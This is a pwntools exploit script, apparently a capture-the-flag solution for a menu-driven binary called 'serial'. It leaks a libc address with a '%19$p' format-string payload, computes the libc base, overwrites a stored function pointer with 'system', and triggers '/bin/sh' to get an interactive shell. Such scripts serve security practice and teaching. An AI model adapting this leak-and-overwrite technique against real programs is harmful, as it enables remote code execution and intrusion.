#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
#context.log_level = "debug"

chall = "./serial"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        # main func start
        b *0x400e93
        # call rdx
        b *0x400a22
        c
        loadsym
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def add(name):
    p.recvuntil("choice >>")
    p.sendline("1")
    p.recvuntil("insert >>")
    p.sendline(name)

def remove(index):
    p.recvuntil("choice >>")
    p.sendline("2")
    p.recvuntil("choice>>")
    p.sendline(str(index))

def dump():
    p.recvuntil("choice >>")
    p.sendline("3")


# input product key
product_key = 615066814080
p.recvuntil("input product key:")
p.sendline(str(product_key))

# leak libc wit FSB
payload = b"%19$p"# leak __libc_start_main+240
payload += b"A" * (0x18 - len(payload))# buffer
payload += p64(elf.plt['printf'])

add(payload)
dump()
p.recvuntil(str(hex(elf.plt['printf']))+'\n')
leak = eval(p.recv(14))
log.info("leak: 0x{:08x}".format(leak))
libc_base = leak - libc.symbols['__libc_start_main'] - 240
log.info("libc base: 0x{:08x}".format(libc_base))

# exec system("/bin/sh")
remove(0)
payload = b"/bin/sh;"
payload += b"B" * (0x18 - len(payload))# buffer
payload += p64(libc_base + libc.symbols['system'])

add(payload)
dump()

p.interactive()
